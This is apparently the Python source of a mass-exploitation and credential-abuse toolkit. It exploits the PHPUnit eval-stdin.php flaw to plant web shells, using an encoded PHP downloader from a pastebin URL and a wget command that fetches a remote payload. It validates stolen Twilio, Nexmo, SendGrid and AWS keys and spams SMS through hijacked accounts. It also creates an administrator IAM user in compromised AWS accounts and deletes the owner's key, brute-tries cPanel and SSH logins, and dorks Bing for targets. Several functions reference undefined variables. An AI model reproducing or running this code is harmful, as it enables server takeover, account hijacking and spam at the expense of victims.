from multiprocessing.dummy import Pool
import random,socket,threading
from re import findall as reg
import requests, re, sys, os
try:from colorama import init
except:os.system("pip install colorama vonage")	
try:import time,hashlib,datetime,ipaddress,paramiko,smtplib,json,urllib3,io,boto3,random
except:os.system("pip install hashlib ipaddress paramiko smtplib urllib3 io boto3")
from multiprocessing.dummy import Pool
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
try:from email.mime.text import MIMEText
except:os.system("pip install email")	
from email.mime.multipart import MIMEMultipart
from socket import gaierror
try:from twilio.rest import Client
except:os.system("pip install twilio")	
init()
fsetting = open("files/yahoo.ini", 'r').read() 
pathop = open("files/path.ini", 'r')
pathline = pathop.read().split('\n')
lock = threading.Lock()
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
white = "\033[97m"
crackt1 = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","/","/"]
crackt = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","-","_"]
region = 0
def slo(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.0001)

def aws_id():
    output = 'AKIA'
    for i in range(16):
        output += random.choice(crackt1[0:38]).upper()
    return output

def aws_key():
    output = ''
    for i in range(40):
        if i == 0 or i == 39:
            ranUpper = random.choice(crackt1[0:38]).upper()
            output += random.choice([ranUpper, random.choice(crackt1[0:38])])
        else:
            ranUpper = random.choice(crackt1[0:38]).upper()
            output += random.choice([ranUpper, random.choice(crackt1)])
    return output
Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
def sg_key():
    output = 'SG.'
    for i in range(22):
        ranUpper = random.choice(crackt[0:38]).upper()
        output += random.choice([ranUpper, random.choice(crackt[0:38])])
    output += '.'
    for i in range(43):
      ranUpper = random.choice(crackt[0:38]).upper()
      output += random.choice([ranUpper, random.choice(crackt[0:38])])
    return output

def print_key_aws(region):
    print(f"{lrd}[{lgn}#{lrd}] GENERATE..")
    print(f"{lrd}[{lgn}#!{lrd}] aws_access_key_id = {lrd}{aws_id()}")
    print(f"{lrd}[{lgn}!{lrd}] aws_secret_access_key= {lrd}{aws_key()}")
    save = open('Result/key_generator/aws.txt', 'a')
    save.write(aws_id()+'|'+aws_key()+'|'+str(region)+'\n')

def print_key_sendgrid():
    print(f"{lrd}[{lgn}#{lrd}] {yw}GENERATE..")
    print("{gn}key : {lgn}" + sg_key())
    save = open('Result/key_generator/sendgrid.txt', 'a')
    save.write(sg_key()+'\n')
    save.close()

def twillio_sender():
    try:
        a = input(f"{lrd}[{lgn}?{lrd}] {gn}input your Account SID : {cn}")
        t = input(f"{lrd}[{lgn}?{lrd}] {gn}input your Auth Key : {cn}")
        phonelist = input(f"{lrd}[{lgn}?{lrd}] {gn}input your phone list : {cn}")
        list = open(phonelist, 'r')
        lista = list.read().split('\n')
        nopetest = '+12496501752'
        
        time.sleep(1)
        print(f"{lrd}[{lgn}#{lrd}] {gn}Checking ....")
        time.sleep(1)
        date = datetime.datetime.now().strftime('%Y-%m-%d')
        balance = get_balance(a,t)
        number = get_phone(a,t)
        type = get_type(a,t)
        bod ='test'
        send = send_sms(a,t,bod,number,nopetest)
        if send == 'die':
            status = 'CANT SEND SMS'
        else:
            status = 'LIVE'
        print (f"""{cn}
------------------------------------------------\n\n
{lrd}[{lgn}+{lrd}] {lgn}STATUS : {lrd}[{gn}{str(status)}{lrd}]
{lrd}[{lgn}+{lrd}] {lgn}Account SID : {lrd}[{gn}{str(a)}{lrd}]
{lrd}[{lgn}+{lrd}] {lgn}Auth Key : {lrd}[{gn}{str(t)}{lrd}]
{lrd}[{lgn}+{lrd}] {lgn}Balance : {lrd}[{gn}{str(balance)}{lrd}]
{lrd}[{lgn}+{lrd}] {lgn}Phone Number list : {lrd}[{gn}{str(number)}{lrd}]
{lrd}[{lgn}+{lrd}] {lgn}Account Type : {lrd}[{gn}{str(type)}{lrd}]\n\n{cn}------------------------------------------------
""")
        open('Result/twillio_sender/twilio_result_check.txt','a').write(f"[+] STATUS : [{str(status)}]\n[+] Account SID : [{str(a)}]\n[+] Auth Key : [{str(t)}]\n[+] Balance : [{str(balance)}]\n[+] Phone Number list : [{str(number)}]\n[+] Account Type : [{str(type)}]")
        
        bod = input(f"{lrd}[{lgn}?{lrd}] {lgn}Enter the message : {cn}")
        if "LIVE" in str(status):
            for i in lista:
                try:
                    if '+1' not in i:
                        nope = '+1'+i
                    else:
                        nope = i
                except:
                    continue
                send = send_sms(a,t,bod,number,str(nope))
                if send == 'die':
                    print(f"{lrd} Failed Send  => {str(nope)} | Balance : {lgn}{str(get_balance(a,t))}")
                    open('Result/twillio_sender/fail_send.txt','a').write(nope+'\n')
                else:
                    print(f"{lgn}Success Send => {str(nope)} | Balance : {lgn}{str(get_balance(a,t))}")
                    open('Result/twillio_sender/success_send.txt','a').write(nope+'\n')
                time.sleep(1)
    except:
        print("INVALID KEY")

def exploit(url):
  try:
    data = "<?php phpinfo(); ?>"
    text = requests.get(url, data=data, timeout=1, verify=False)
    urls = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","")
    if "phpinfo()" in text.text:
      data2 = "<?php eval('?>'.base64_decode('PD9waHAgPz48P3BocApmdW5jdGlvbiBhZG1pbmVyKCR1cmwsICRpc2kpIHsKICAgICRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7CiAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOwogICAgcmV0dXJuIGN1cmxfZXhlYygkY2gpOwogICAgY3VybF9jbG9zZSgkY2gpOwogICAgZmNsb3NlKCRmcCk7CiAgICBvYl9mbHVzaCgpOwogICAgZmx1c2goKTsKfQppZiAoYWRtaW5lcigiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1pLZlhTdUJYIiwgImRldi5waHAiKSkgewogICAgZWNobyAiU3Vrc2VzIjsKfSBlbHNlIHsKICAgIGVjaG8gImZhaWwiOwp9Cj8+')); ?>"
      spawn = requests.get(url, data=data2, timeout=1, verify=False)
      if "Sukses" in spawn.text:
        print(f"{lrd}[{lgn}Shell Info{lrd}] {gn}"+urls+" | {lgn}SHELL SUCCESS")
        buildwrite = url.replace("eval-stdin.php","dev.php")+"\n"
        shellresult = open("Result/phpunit_shell_1.txt","a")
        shellresult.write(buildwrite)
        shellresult.close()
      else:
        print(f"{lrd}[{lgn}Shell Info{lrd}] {gn}{urls} | {lrd}FAILED")
    else:
      print(f"{lrd}[{lgn}Shell Info{lrd}] {gn}{urls} | {lrd}BAD")
  except:
    print(f"{lrd}[{lgn}Shell Info{lrd}]{gn} TRY METHOD 2..")
    try:
      koc = tod.get(urls + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", verify=False, timeout=1)
      if koc.status_code == 200:
        peylod = "<?php echo 'Con7ext#'.system('uname -a').'#'; ?>"
        peylod2 = "<?php echo 'ajg'.system('wget https://raw.githubusercontent.com/rintod/toolol/master/payload.php -O c.php'); ?>"
        ree = tod.post(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=peylod, verify=False)
        if 'Con7ext' in ree.text:
          bo = tod.post(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=peylod2, verify=False)
          cok = tod.get(site +"/vendor/phpunit/phpunit/src/Util/PHP/c.php", verify=False)
          if cok.status_code == 200 and '>>' in cok.text:
            print(f"{lrd}[{lgn}Shell Info{lrd}] {gn}"+urls+" | {lgn}SHELL SUCCESS")
            shellresult = open("Result/phpunit_shell_2.txt","a")
            shellresult.write(site+"/vendor/phpunit/phpunit/src/Util/PHP/c.php")
            shellresult.close()
          else:
            print(f"{lrd}[{lgn}Shell Info{lrd}] {gn}{urls} | {lrd}BAD")
        else:
          print(f"{lrd}[{lgn}Shell Info{lrd}] {gn}{urls} | {lrd}BAD")
      else:
        print(f"{lrd}[{lgn}Shell Info{lrd}] {gn}{urls} | {lrd}BAD")
    except:
      print(f"{lrd}[{lgn}Shell Info{lrd}] {gn}{urls} | {lrd}BAD")



def get_balance(a,t):
    r = requests.get('https://api.twilio.com/2010-04-01/Accounts/'+a+'/Balance.json', auth=(a,t))
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    balance = resp ['balance']
    currency = resp ['currency']
    return str(balance)+' '+str(currency)

def get_phone(a,t):
    client = Client(a,t)
    incoming_phone_numbers = client.incoming_phone_numbers.list(limit=20)
    for record in incoming_phone_numbers:
        return record.phone_number

def get_type(a,t):
    client = Client(a,t)
    account = client.api.accounts.create()  
    return account.type

def send_sms(a,t,bod,phone,tos):
    try:
        client = Client(a,t)
        message = client.messages.create(
                                    body=str(bod),
                                    from_= phone,
                                    to=tos
                                )
        return message.status
    except:
        return 'die' 

def checkcpanel(url,user,paswd):
        try:
            req = requests.get(url + "/cpanel", verify=False)
            if req.status_code == 200 and "<a href=\"https://go.cpanel.net/privacy\"" in req.text:
              url = url.split("/")
              datas = {
                  "user": user,
                  "pass": paswd,
                  "goto": "/"
              }
              req = requests.post(url[0] + "//" + url[2] + ":2082/login/?login_only=1", data=datas, verify=False)
              if "redirect" in req.text and "security_token" in req.text:
                  cpanel = url + "|" + user + "|" + paswd
                  sukses = open("Result/cpanel_crack.txt", "a")
                  sukses.write(cpanel)
                  sukses.close()        
        except Exception as e:
            print(f"{lrd}[{lgn}!{lrd}] {rd}CPANEL ERROR : {lrd}" + str(e))

        try:
          bross = url.split("/")
          ip = socket.gethostbyname(bross[2])
          ssh = paramiko.SSHClient()
          ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
          ssh.connect(ip, port=22, username=self.user, password=self.paswd, timeout=4)
          cpanel2 = ip + "|" + user + "|" + paswd
          sukses = open("Result/ssh_crack.txt", "a")
          sukses.write(cpanel2)
          sukses.close()  
        except (paramiko.ssh_exception.AuthenticationException, Exception):
          print(f"{lrd}[{lgn}!{lrd}] {rd}SSH ERROR : {lrd}" + str(e))
    
def sendgridcheck(sapi):
  sukses = open("Result/sendgrid_checker/success.txt", "a")
  gagal = open("Result/sendgrid_checker/fail.txt", "a")
  try:
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0','Authorization': 'Bearer '+sapi}
    NexmoGetBalance = requests.get('https://api.sendgrid.com/v3/user/credits',headers=headers)
    Limit = json.loads(NexmoGetBalance.text)["total"]
    Used = json.loads(NexmoGetBalance.text)["used"]
    SendgridMf = requests.get('https://api.sendgrid.com/v3/user/email',headers=headers)
    Mf = json.loads(SendgridMf.text)['email']
    print(f'{lrd}[{lgn}+{lrd}] {lgn}User : {lrd}\n{lrd}[{lgn}+{lrd}] {lgn}Limit : {gn}{Limit}\n{lrd}[{lgn}+{lrd}] {lgn}Used : {gn}{Used}\n{lrd}[{lgn}+{lrd}] {lgn}Mail From : {gn}{Mf}')
    sukses.write('user    : {apikey'"\n"'stripkey    : '+sapi+"\nStatus    : %s\n" % Limit)
    sukses.write("used    : %s\n" % Used)
    sukses.write("mailfrom    : %s\n" % Mf)
    sukses.write("---------------------------------------------------------------------------\n")
    sukses.close()
  except:
    print(f"{lrd}[{lgn}{sapi}{lrd}] : {rd}Get data failed")
    gagal.write(sapi+" -> Failed Get Data\n")

def awslimitcheck(ACCESS_KEY,SECRET_KEY,REGION):
    try:
      email = ACCESS_KEY
      password = SECRET_KEY
      region = REGION
      client = boto3.client(
			'ses'
			,aws_access_key_id=email
			,aws_secret_access_key=password
			,region_name = region)
      data = "[O][ACCOUNT]{}|{}|{}".format(email,password,region)
      with lock:
        print(f"{lgn} {data}")
      response = client.get_send_quota()
      with lock:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} [{gn}Account Active{lgn}]")
      limit =  f"Max Send email 24 Hours: {response['Max24HourSend']} "
      ddd = client.list_verified_email_addresses(
			)
      getEmailListVer = f"Email Verification from mail:{ddd['VerifiedEmailAddresses']}"
      with lock:
        print(getEmailListVer)
      response = client.list_identities(
			IdentityType='EmailAddress',
			MaxItems=123,
			NextToken='',
			)
      listemail = f"Email: {response['Identities']}"
      with lock:
        print(listemail)
      statistic = client.get_send_statistics()
      getStatistic = f"{lgn}Email Sent Today Ini : {gn}{statistic['SendDataPoints']}"
      with lock:
        print(getStatistic)
        print(f"{lrd}[{lgn}+{lrd}] {lgn}All Data")
      xxx = email+"|"+password+"|"+region + "|" +  limit +"|" + listemail
      with lock:
        print(xxx)
      remover = str(xxx).replace('\r', '')
      simpan = open('Success_Check_aws_key_limit.txt', 'a')
      simpan.write(remover+'\n\n')
      simpan.close()
      with lock:
        print(f"{lrd}[{lgn}+{lrd}] {lgn}Total SimpValid : {gn}{totz}")
      response = client.list_users(
			)
      print(response)
					
    except:
      print(f"{lrd}[{lgn}+{lrd}] {lgn}[Account DIE] | {cn}region => {gn}{REGION}")
      pass

def nexmosend(url,a,s):
    r = requests.get('https://rest.nexmo.com/sms/json?api_key='+str(a)+'&api_secret='+str(s)+'&to=+923117708953&text=test&from=TEST')
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    test = resp['messages']
    try:
        balance = test[0]["remaining-balance"]
    except:
        balance = "Error"
    try:
        errorcode = test[0]["error-text"]
    except:
        errorcode = "UNKNOWN"

    if "Quota Exceeded - rejected" in errorcode:
        print(f"{str(a)} => {lgn}Quota Exceeded - rejected | Balance :{lrd} {str(balance)}")
    elif "Bad Credentials" in errorcode:
        print(f"{str(a)} => {lrd}Bad Credentials")
    elif "Error" not in balance:
        print(f"{str(a)} => {lgn}Valid | Balance :{lrd} {str(balance)}")
        build = 'API_KEY : '+str(a)+'\nAPI_SECRET : '+str(s)+'\nBALANCE : '+str(balance)+'\n\n'
        save = open('Result/valid_nexmo.txt', 'a') 
        save.write(build)
        save.close()
    else:
        print(f"{str(a)} => {lgn}Cant Send to US | error code: str(errorcode)")
        build = 'API_KEY : '+str(a)+'\nAPI_SECRET : '+str(s)+'\nBALANCE : '+str(balance)+'ERROR : '+str(errorcode)+'\n\n'
        save = open('Result/valid_nexmo.txt', 'a') 
        save.write(build)
        save.close()


def twilliocheck(url,acc_sid,acc_key,acc_from):
  account_sid = acc_sid
  auth_token = acc_key
  client = Client(account_sid, auth_token)
  account = client.api.accounts.create()
  
  if "Unable to create record: Authenticate" not in account.sid:
    print("TWILLIO VALID SEND API")
    balance = get_balance(acc_sid,acc_key)
    number = get_phone(acc_sid,acc_key)
    type = get_type(acc_sid,acc_key)
    bod ='test'
    nopetest = '+12496501752'
    send = send_sms(acc_sid,acc_key,bod,number,nopetest)
    if send == 'die':
        status = 'CANT SEND SMS TO US'
    else:
        status = 'LIVE'
    
    save = open('Result/valid_twillio.txt', 'a')
    build = 'URL: '+str(url)+'\nSTATUS : '+format(str(status))+'\nAccount SID : '+str(acc_sid)+'\nAuth Key: '+str(acc_key)+'\nBalance : '+format(str(balance))+'\nFROM: '+format(str(number))+'\nAccount Type : '+format(str(type))+'\n\n------------------------------------------------\n'
    save.write(build)
    save.close()
    
def autocreate(ACCESS_KEY,SECRET_KEY,REGION):
    try:
        UsernameLogin = "jSDSsajsnhjjjjjjwyyw"
        user = ACCESS_KEY
        keyacces = SECRET_KEY
        regionz = REGION
        client = boto3.client(
        'iam'
        ,aws_access_key_id=user
        ,aws_secret_access_key=keyacces
        ,region_name = regionz)
        data = "[O][ACCOUNT]{}|{}|{}".format(user,keyacces,regionz)
        with lock:
          print(data)
        Create_user = client.create_user(
        UserName=UsernameLogin,
        )
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}succes create iam lets go to dashboard!")
        bitcg = f"User: {Create_user['User'] ['UserName']}"
        xxxxcc = f"User: {Create_user['User'] ['Arn']}"
        
        with lock:
          print(bitcg)
        with lock:
          print(xxxxcc)
        with lock:
          print(Create_user)
        pws = "admajsd21334#1ejeg2shehhe"
        with lock:
          print("Username = " + UsernameLogin)
          print("create acces login for" + UsernameLogin)
        Buat = client.create_login_profile(
        Password=pws,
        PasswordResetRequired=False,
        UserName=UsernameLogin
        )
        with lock:
          print(Buat)
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}password : {gn}" + pws)
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}give access  User to Admin")
        Admin = client.attach_user_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        UserName=UsernameLogin,
        )
        xxx = UsernameLogin+"|"+pws+"|"+bitcg + "|" +  xxxxcc
        with lock:
          print(xxx)
        remover = str(xxx).replace('\r', '')
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}Success crack.. save in imaccount.txt")
        simpan = open('Result/IamAccount.txt', 'a')
        simpan.write(remover+'\n\n')
        simpan.close()
        with lock:
          print(Admin)
        response = client.delete_access_key(
          AccessKeyId=user
        )
        with lock:
          print(response)
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}succesful your key is privat only now !")
        with lock:
          print(f"{lgn}{ACCESS_KEY} ==> Success Create User")
    except Exception as e:
        with lock:
          print(f"{lgn}ACCESS_KEY+ ==> {lrd}Failed Create User")
        pass

def autocreateses(url,ACCESS_KEY,SECRET_KEY,REGION):
    try:
        UsernameLogin = "jSDSsajsnhjjjjjjwyyw"
        user = ACCESS_KEY
        keyacces = SECRET_KEY
        regionz = REGION
        client = boto3.client(
        'iam'
        ,aws_access_key_id=user
        ,aws_secret_access_key=keyacces
        ,region_name = regionz)
        data = "[O][ACCOUNT]{}|{}|{}".format(user,keyacces,regionz)
        with lock:
          print(data)
        Create_user = client.create_user(
        UserName=UsernameLogin,
        )
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}succes create iam lets go to dashboard!")
        bitcg = f"User: {Create_user['User'] ['UserName']}"
        xxxxcc = f"User: {Create_user['User'] ['Arn']}"
        
        with lock:
          print(bitcg)
        with lock:
          print(xxxxcc)
        with lock:
          print(Create_user)
        pws = "admajsd21334#1ejeg2shehhe"
        with lock:
          print("Username = " + UsernameLogin)
          print("create acces login for" + UsernameLogin)
        Buat = client.create_login_profile(
        Password=pws,
        PasswordResetRequired=False,
        UserName=UsernameLogin
        )
        with lock:
          print(Buat)
        
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}password : {gn}" + pws)
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}give access  User to Admin")
        Admin = client.attach_user_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        UserName=UsernameLogin,
        )
        xxx = url+"|"+UsernameLogin+"|"+pws+"|"+bitcg + "|" +  xxxxcc
        with lock:
          print(xxx)
        remover = str(xxx).replace('\r', '')
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}Success crack.. save in imaccount.txt")
        simpan = open('Result/IamAccount.txt', 'a')
        simpan.write(remover+'\n\n')
        simpan.close()
        with lock:
          print(Admin)
        response = client.delete_access_key(
          AccessKeyId=user
        )
        with lock:
          print(response)
        with lock:
          print(f"{lrd}[{lgn}+{lrd}] {lgn}succesful your key is privat only now !")
        with lock:
          print(f"{lgn}{ACCESS_KEY} Success Create User")
    except Exception as e:
        with lock:
          print(f"{lgn}{ACCESS_KEY} {lrd}Failed Create User")
        pass

class dorker(object):

    def __init__(self,dork,pages,proxy):
        self.dork = dork
        self.page_ammount = pages
        self.domains_bing = []
        self.proxy_required = proxy
        self.first_page_links = []


    def filter_and_adding(self,domains_list):
        alert_string = lrd + '[' + lgn + 'INFO' + lrd + ']' + cn
        print(alert_string+"-> Checking Smtp ..")
        print()
        data = open('blacklist/sites.txt').readlines()
        new_data = [items.rstrip() for items in data]
        for domains in domains_list:
            domain_data = domains.split('/')
            new_domain = domain_data[0]+"//"+domain_data[2]+'/'
            if new_domain not in new_data:
                self.domains_bing.append(new_domain)
                jembotngw2(new_domain)
                print(new_domain,file=open('result/sitesgrab.txt', 'a'))



    def first_page(self):
        try:
            url = "https://www.bing.com/search?q=" + self.dork + "&first=" + '1' + "&FORM=PERE"
            header = {
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
            }
            source_code = requests.get(url, headers=header).text
            keyword = '<li class="b_algo"><h2><a href="'
            split_data = source_code.split(keyword)
            for x in range(10):
                links_ = split_data[x + 1].split('"')[0]
                self.first_page_links.append(links_)
        except IndexError:
            pass

    def searcher(self):
        for i in range(self.page_ammount):
            url = "https://www.bing.com/search?q=" + self.dork +"&first=" + str(i)+'1' + "&FORM=PERE"
            info_string_box = lrd+'['+lgn+'-'+lrd+']'+cn
            added_sting = lrd + '[' + lgn + '+' + lrd + ']' + cn

            print(info_string_box+f" Printing Page  {i}")
            print()
            header = {
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
            }
            try:
                source_code = requests.get(url,headers=header).text
                keyword = '<li class="b_algo"><h2><a href="'
                split_data = source_code.split(keyword)
                temporary_domain_list = []
                try:
                    for x in range(10):
                        links_ = split_data[x+1].split('"')[0]
                        temporary_domain_list.append(links_)
                        print(added_sting+" - "+links_)

                except IndexError:
                    pass

                print()
                print(f'{yw}--------')
                self.filter_and_adding(temporary_domain_list)


            except requests.exceptions.HTTPError:
                print(f"{lrd}[{lgn}!{lrd}] {lrd}Http error retrying")
                continue
            except requests.exceptions.ConnectTimeout:
                print(f"{lrd}[{lgn}!{lrd}] {lrd}Connection timed out error retrying")
                continue
            except requests.exceptions.Timeout:
                print(f"{lrd}[{lgn}!{lrd}] {lrd}Timeout error retrying")
                continue

            if i != 0:
                if self.first_page_links == temporary_domain_list:
                    print(f"{lrd}[{lgn}+{lrd}] {lgn}Same Urls Found Again. Last Resulsts Reached | Removing Dublicates.")
                    break

    def start(self):

        self.first_page()
        self.searcher()

        print(f"Done Total sites scrapped {len(self.domains_bing)}")


proxy_error = 0
sites_list = []

if os.name == "nt":
	try:os.system("cls")
	except:os.system("clear")

init(convert=True)


def ip_grabber(site,sites_length,current):
    try:
        ip = socket.gethostbyname(site)
        info_string_box = lrd + '[' + lgn + 'SITE' + lrd + ']' + cn
        added_sting = lrd + '[' + lgn + 'IP' + lrd + ']' + cn
        print(info_string_box + f': {site} - ' + added_sting + f': {ip}')
        oother = open('result/websitetoip.txt', "a")
        oother.write(ip+"\n")
        oother.close()
    except socket.gaierror:
        pass

def ip_grabberautoscan(site,sites_length,current):
    try:
        ip = socket.gethostbyname(site)
        info_string_box = lrd + '[' + lgn + 'SITE' + lrd + ']' + cn
        added_sting = lrd + '[' + lgn + 'IP' + lrd + ']' + cn
        print(info_string_box + f': {site} - ' + added_sting + f': {ip}')
        dorkscan(ip)
        oother = open('result/websitetoip.txt', "a")
        oother.write(ip+"\n")
        oother.close()
    except socket.gaierror:
        pass

def clean():
  lines_seen = set()
  Targetssa = input(f"{lrd}[{lgn}?{lrd}] {lgn}Input Your List : {cn}{cn}") 
  outfile = open('rd-'+Targetssa, "a")
  infile = open(Targetssa, "r")
  for line in infile:
    if line not in lines_seen:
      outfile.write(line)
      lines_seen.add(line)
  outfile.close()
  infile.close()
  print(f"{lrd}[{lgn}+{lrd}] {lgn}Duplicate removed successfully!\n{lrd}[{lgn}+{lrd}] {lgn}saved as rd- {str(Targetssa)}\n{lrd}[{lgn}+{lrd}] {lgn}Load Menu on 1 sec\n{yw}-------------------------------------")
  time.sleep(1)
  spider_black()

def autodork():
  dork = input(f"{lrd}[{lgn}?{lrd}] {lgn}Dork/Keyword [not a file but type directly] :{cn} ")
  print()
  print(f"{lrd}[{lgn}+{lrd}] {lgn}select your country, all for global | for country search in,de,fr type directly without\n")
  country = input(f"{lrd}[{lgn}?{lrd}] {lgn}Country: {cn}")
  if country == 'all':
      dork_new = dork
  else:
      dork_new = dork+' site:'+country
  # Perform anti public actions here
  pages_ = input(f"{lrd}[{lgn}?{lrd}] {lgn}Pages [Note: Bing may have limited results] : {cn}")
  dorker(dork_new,int(pages_),False).start()

binglist = {"http://www.bing.com/search?q=&count=50&first=1",
"http://www.bing.com/search?q=&count=50&first=51",
"http://www.bing.com/search?q=&count=50&first=101",
"http://www.bing.com/search?q=&count=50&first=151",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.com/search?q=&count=50&first=251",
"http://www.bing.com/search?q=&count=50&first=301",
"http://www.bing.com/search?q=&count=50&first=351",
"http://www.bing.com/search?q=&count=50&first=401",
"http://www.bing.com/search?q=&count=50&first=451",
"http://www.bing.com/search?q=&count=50&first=501",
"http://www.bing.com/search?q=&count=50&first=551",
"http://www.bing.com/search?q=&count=50&first=601",
"http://www.bing.com/search?q=&count=50&first=651",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.vn/search?q=&count=50&first=101"}

def dorkscan(dork):
  jembotngw2(dork)
  if "ip" not in dork:
    dork = " ip:\""+dork+"\" "
  print(f"{lrd}[{lgn}+{lrd}] {lgn}START REVERSE FROM IP => {gn}{dork}")
  for bing in binglist:
    bingg = bing.replace("&count",dork+"&count")
    try:
      r = requests.get(bingg)
      checktext = r.text
      checktext = checktext.replace("<strong>","")
      checktext = checktext.replace("</strong>","")
      checktext = checktext.replace('<span dir="ltr">','')
      checksites = re.findall('<cite>(.*?)</cite>',checktext)
      for sites in checksites:
        sites = sites.replace("http://","protocol1")
        sites = sites.replace("https://","protocol2")
        sites = sites + "/"
        site = sites[:sites.find("/")+0]
        site = site.replace("protocol1","http://")
        site = site.replace("protocol2","https://")
        try:
          jembotngw2(site)
        except:
            pass
    except:
      pass

def dorkscansave(dork):
  jembotngwsave(dork)
  if "ip" not in dork:
    dork = " ip:\""+dork+"\" "
  print(f"{lrd}[{lgn}+{lrd}] {lgn}START REVERSE FROM IP => {gn}{dork}")
  for bing in binglist:
    bingg = bing.replace("&count",dork+"&count")
    try:
      r = requests.get(bingg)
      checktext = r.text
      checktext = checktext.replace("<strong>","")
      checktext = checktext.replace("</strong>","")
      checktext = checktext.replace('<span dir="ltr">','')
      checksites = re.findall('<cite>(.*?)</cite>',checktext)
      for sites in checksites:
        sites = sites.replace("http://","protocol1")
        sites = sites.replace("https://","protocol2")
        sites = sites + "/"
        site = sites[:sites.find("/")+0]
        site = site.replace("protocol1","http://")
        site = site.replace("protocol2","https://")
        try:
          jembotngwsave(site)
        except:
            pass
    except:
      pass

def reverseip(dork):
  ori = dork
  if "ip" not in dork:
    dork = " ip:\""+dork+"\" "
  print(f"{lrd}[{lgn}+{lrd}] {lgn}START REVERSE FROM IP => {gn}{ori}")
  for bing in binglist:
    bingg = bing.replace("&count",dork+"&count")
    try:
      r = requests.get(bingg)
      checktext = r.text
      checktext = checktext.replace("<strong>","")
      checktext = checktext.replace("</strong>","")
      checktext = checktext.replace('<span dir="ltr">','')
      checksites = re.findall('<cite>(.*?)</cite>',checktext)
      for sites in checksites:
        sites = sites.replace("http://","protocol1")
        sites = sites.replace("https://","protocol2")
        sites = sites + "/"
        site = sites[:sites.find("/")+0]
        site = site.replace("protocol1","http://")
        site = site.replace("protocol2","https://")
        try:
          print("[+] "+ori+" => "+site)
          live = open('Result/result_reverseip.txt', 'a')
          live.write(str(site)+ '\n')
          live.close()
        except:
          pass
    except:
      pass

def sparkpostmail():

  ip_listx = open("settings.ini", 'r').read()

  if "sparkpostmail=on" in ip_listx:
    sparkpostmail = "on"
    return sparkpostmail
  else:
    sparkpostmail = "off"
    return sparkpostmail
def and1():
  ip_listx = open("settings.ini", 'r').read()

  if "and1=on" in ip_listx:
    and1 = "on"
    return and1
  else:
    and1 = "off"
    return and1
def zimbra():
  ip_listx = open("settings.ini", 'r').read()

  if "zimbra=on" in ip_listx:
    zimbra = "on"
    return zimbra
  else:
    zimbra = "off"
    return zimbra

def relay():
  ip_listx = open("settings.ini", 'r').read()

  if "gsuite-relay=on" in ip_listx:
    relay = "on"
    return relay
  else:
    relay = "off"
    return relay

def sendinblue():
  ip_listx = open("settings.ini", 'r').read()

  if "sendinblue=on" in ip_listx:
    sendinblue = "on"
    return sendinblue
  else:
    sendinblue = "off"
    return sendinblue

def mandrillapp():
  ip_listx = open("settings.ini", 'r').read()

  if "mandrillapp=on" in ip_listx:
    mandrillapp = "on"
    return mandrillapp
  else:
    mandrillapp = "off"
    return mandrillapp

def zoho():
  ip_listx = open("settings.ini", 'r').read()

  if "zoho=on" in ip_listx:
    zoho = "on"
    return zoho
  else:
    zoho = "off"
    return zoho
def sendgrid():
  ip_listx = open("settings.ini", 'r').read()

  if "sendgrid=on" in ip_listx:
    sendgrid = "on"
    return sendgrid
  else:
    sendgrid = "off"
    return sendgrid
def office365():
  ip_listx = open("settings.ini", 'r').read()

  if "office365=on" in ip_listx:
    office365 = "on"
    return office365
  else:
    office365 = "off"
